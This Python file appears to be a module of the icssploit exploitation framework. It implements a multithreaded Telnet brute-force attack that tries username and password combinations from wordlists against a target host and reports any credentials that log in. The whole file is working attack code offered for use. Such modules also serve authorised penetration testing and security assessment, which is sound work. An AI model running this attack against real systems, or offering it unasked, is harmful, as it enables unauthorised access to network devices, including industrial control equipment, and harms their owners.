import threading
import itertools
import telnetlib

from icssploit import (
    exploits,
    wordlists,
    print_status,
    print_error,
    LockedIterator,
    print_success,
    print_table,
    boolify,
    multi,
)


class Exploit(exploits.Exploit):
    """
    Module performs bruteforce attack against Telnet service.
    If valid credentials are found, they are displayed to the user.
    """
    __info__ = {
        'name': 'Telnet Bruteforce',
        'description': 'Module performs bruteforce attack against Telnet service. '
                       'If valid credentials are found, they are displayed to the user.',
        'authors': [
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # icssploit module
        ],
        'references': [
            '',
        ],
        'devices': [
            'Multi',
        ],
    }

    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
    port = exploits.Option(23, 'Target port')

    threads = exploits.Option(8, 'Number of threads')
    usernames = exploits.Option('admin', 'Username or file with usernames (file://)')
    passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
    verbosity = exploits.Option('yes', 'Display authentication attempts')
    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')

    credentials = []

    def run(self):
        self.credentials = []
        self.attack()

    @multi
    def attack(self):
        try:
            tn = telnetlib.Telnet(self.target, self.port)
            tn.expect(["login: ", "Login: "], 5)
            tn.close()
        except:
            print_error("Connection error {}:{}".format(self.target, self.port))
            return

        if self.usernames.startswith('file://'):
            usernames = open(self.usernames[7:], 'r')
        else:
            usernames = [self.usernames]

        if self.passwords.startswith('file://'):
            passwords = open(self.passwords[7:], 'r')
        else:
            passwords = [self.passwords]

        collection = LockedIterator(itertools.product(usernames, passwords))
        self.run_threads(self.threads, self.target_function, collection)

        if len(self.credentials):
            print_success("Credentials found!")
            headers = ("Target", "Port", "Login", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        module_verbosity = boolify(self.verbosity)
        name = threading.current_thread().name

        print_status(name, 'thread is starting...', verbose=module_verbosity)

        while running.is_set():
            try:
                user, password = next(data)
                user = user.strip()
                password = password.strip()
            except StopIteration:
                break
            else:
                retries = 0
                while retries < 3:
                    try:
                        tn = telnetlib.Telnet(self.target, self.port)
                        tn.expect(["Login: ", "login: "], 5)
                        tn.write(user + "\r\n")
                        tn.expect(["Password: ", "password"], 5)
                        tn.write(password + "\r\n")
                        tn.write("\r\n")

                        (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)
                        tn.close()

                        if i != -1:
                            print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                        else:
                            if any([x in res for x in ["#", "$", ">"]]) or len(res) > 500:  # big banner e.g. mikrotik
                                if boolify(self.stop_on_success):
                                    running.clear()

                                print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                                self.credentials.append((self.target, self.port, user, password))
                        tn.close()
                        break
                    except EOFError:
                        print_error(name, "Connection problem. Retrying...", verbose=module_verbosity)
                        retries += 1

                        if retries > 2:
                            print_error("Too much connection problems. Quiting...", verbose=module_verbosity)
                            return
                        continue

        print_status(name, 'thread is terminated.', verbose=module_verbosity)
